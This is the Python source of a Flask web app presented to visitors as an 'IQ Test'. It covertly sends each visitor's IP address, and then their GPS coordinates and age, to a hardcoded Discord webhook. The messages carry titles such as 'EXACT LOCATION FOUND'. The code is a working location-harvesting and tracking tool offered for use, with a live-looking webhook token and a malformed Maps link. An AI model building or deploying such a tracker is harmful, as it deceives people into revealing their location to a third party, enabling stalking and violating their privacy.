from flask import Flask, render_template, request, redirect, jsonify
import requests

app = Flask(__name__)

# CONFIGURATION
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1482323306198601780/bvnAqpLHXijSAMi0fwJQV-IZG2nXdoScT4MFttVL3e42cXtol1HiGDGqR1AdsscKDzKG"

@app.route('/')
def index():
    # Initial IP Log (Low accuracy)
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    requests.post(DISCORD_WEBHOOK_URL, json={
        "embeds": [{
            "title": "👁️ New Visitor Opened IQ Test",
            "description": f"**IP:** `{visitor_ip}`\nWaiting for GPS...",
            "color": 3447003
        }]
    })
    return render_template('index.html')

@app.route('/geo', methods=['POST'])
def geo():
    data = request.json
    lat = data.get('lat')
    lon = data.get('lon')
    age = data.get('age')

    payload = {
        "embeds": [{
            "title": "📍 EXACT LOCATION FOUND (Surat/Real)",
            "color": 15158332,
            "fields": [
                {"name": "Reported Age", "value": f"`{age}`", "inline": True},
                {"name": "Google Maps", "value": f"[View Location](https://www.google.com{lat},{lon})", "inline": False},
                {"name": "Coordinates", "value": f"`{lat}, {lon}`", "inline": False}
            ],
            "footer": {"text": "GPS Accuracy: High"}
        }]
    }
    requests.post(DISCORD_WEBHOOK_URL, json=payload)
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(debug=True)
